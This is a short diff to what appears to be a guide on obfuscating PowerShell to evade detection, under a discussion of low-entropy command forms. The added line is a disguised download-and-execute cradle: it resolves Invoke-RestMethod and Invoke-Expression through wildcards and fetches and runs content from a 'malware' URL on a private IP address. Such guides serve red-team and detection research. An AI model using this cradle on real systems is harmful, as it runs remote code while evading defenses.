@@ -160,7 +160,7 @@ Could be obfuscated to:
 ```
 Or even better, this one, that has a lower `Shannon entropy` value:
 ```
-(Get-Command i************************************************************e-rest*).name
+&(Get-Command i************************************************************e-rest*) -uri https://192.168.0.66/malware | &(gcm i*x)
 ```
 
 ## Substitute Loops
